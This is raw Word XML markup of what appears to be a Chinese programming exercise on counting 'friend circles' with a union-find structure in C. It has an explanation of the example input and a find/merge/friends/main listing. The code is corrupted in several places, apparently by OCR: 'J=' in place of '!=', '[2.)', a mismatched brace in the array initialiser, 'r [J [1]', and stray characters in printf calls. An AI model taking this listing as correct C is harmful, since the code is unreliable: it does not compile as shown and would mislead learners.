          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>3</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>是好友，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>4</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>5</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>是好友，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体" w:cs="宋体"/>
          <w:color w:val="021E3F"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>则</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="021E3F"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体" w:cs="宋体"/>
          <w:color w:val="021E3F"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t xml:space="preserve">、 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>3</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>属于一个朋友圈，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>4</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>5</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>属于另一个朋友圈，结果为</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="021E3F"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">2 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>个朋友圈。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="280" w:line="330" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="420"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>#</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>include &lt;stdio.h&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="280" w:line="330" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="420"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>int set [10] = {0};</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:line="330" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="420"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>int find (int a)</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int r, i, j;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>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r = a;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>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while (r != set[r])</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="330" w:lineRule="exact"/>
        <w:ind w:left="1240" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>r = set[r];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>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i = a;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:line="330" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="820"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>while(i J= r)</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j = set[i];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="330" w:lineRule="exact"/>
        <w:ind w:left="1240" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>set[i] = r;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:line="330" w:lineRule="exact"/>
        <w:ind w:left="1240" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>i = j；</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w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="600" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="820"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>return r;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:line="330" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="420"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>void merge (int a, int b)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="42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line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="820"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>int a_father = find(a);</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 xml:space="preserve">int b_father </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">= </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>find(b)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>;</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if(a_father == b_father)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="1320" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>return;</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else if(a_father &lt; b_father)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="1320" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>set[b_father] = a_father;</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else</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="620" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="1320" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>set[a_father] = b_father;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="100" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>int friends (int n, int m, int r [] [2.)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>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00"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>int i, count=0;</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for(i=0;i&lt;n;i++)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="1320" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>set[i] = i;</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for(i=0;i&lt;m;i++)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="1320" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>merge(r[i] [0],r[i] [1]);</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for(i=0;i&lt;n;i++)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="1320" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>if(set [i] == i)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="1760" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>count++;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="620" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="900"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>return count;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="100" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>int main()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>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240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="900"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>int n=5, m=3, count=0, i;</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int r[3] [2] = {{1,2}, {2,3}, {4, 5]};</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 xml:space="preserve">printf </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>("朋友圈关系:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>\n");</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for(i=0;i&lt;3;i++)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="3090"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="1320" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>printf</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>r [i] [0], r [J [1]);</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 xml:space="preserve">printf </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>(侦)</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count = friends (n, m, r);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>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 xml:space="preserve">printf </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>("朋友圈个数为：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>\n%d\n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:vertAlign w:val="superscript"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>，z</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>, count);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
